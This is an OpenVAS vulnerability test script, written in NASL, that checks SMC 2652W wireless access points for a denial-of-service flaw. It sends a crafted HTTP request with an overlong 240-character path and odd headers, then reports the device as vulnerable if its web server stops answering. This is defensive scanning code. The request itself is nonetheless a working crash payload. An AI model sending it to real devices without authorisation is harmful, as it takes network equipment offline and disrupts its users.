# OpenVAS Vulnerability Test
# $Id: smc_www_dos.nasl 13660 2019-02-14 09:48:45Z cfischer $
# Description: Crash SMC AP
#
# Authors:
# John Lampe ... j_lampe@bellsouth.net
# changes by rd:
# -fill the Host header to work through a transparent proxy
# -use http_is_dead() to determine success of script
#
# Copyright:
# Copyright (C) 2002 John Lampe ... j_lampe@bellsouth.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11141");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Crash SMC AP");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2002 John Lampe...j_lampe@bellsouth.net");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Contact vendor for a fix.");

  script_tag(name:"summary", value:"The remote SMC 2652W Access point web server crashes when sent a
  specially formatted HTTP request.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

# found with SPIKE 2.7 http://www.immunitysec.com/spike.html
# req string directly horked from SPIKE API

include ("http_func.inc");

port = get_http_port(default:80);
if(http_is_dead(port: port))
  exit(0);

req = string("GET /", crap(240), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\r\n");
req = string(req, "Referer: http://localhost/bob\r\n");
req = string(req, "Content-Type: application/x-www-form-urlencoded\r\n");
req = string(req, "Connection: Keep-Alive\r\n");
req = string(req, "Cookie: VARIABLE=FOOBAR; path=/\r\n");
req = string(req, "User-Agent: ", http_get_user_agent(), "\r\n");
req = string(req, "Variable: result\r\n");
req = string(req, "Host: ", get_host_name(), "\r\nContent-length: 13\r\n");
req = string(req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n");
req = string(req, "Accept-Encoding: gzip\r\nAccept-Language:en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n");

http_send_recv(port:port, data:req);
if(http_is_dead(port: port)) {
  security_message(port);
}